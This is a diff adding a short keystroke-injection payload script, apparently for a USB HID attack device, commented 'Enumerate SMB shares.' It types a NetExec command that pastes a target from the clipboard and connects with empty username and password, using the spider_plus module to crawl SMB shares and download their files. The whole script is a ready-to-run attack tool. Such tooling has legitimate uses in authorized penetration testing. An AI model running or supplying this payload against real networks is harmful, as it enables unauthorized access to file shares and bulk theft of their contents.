@@ -1,0 +1,11 @@
+DEFAULTCHARDELAY 15
+
+REM DOC: Enumerate SMB shares.
+
+STRING nxc smb 
+
+CTRL SHIFT v
+
+STRING  -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
+
+ENTER
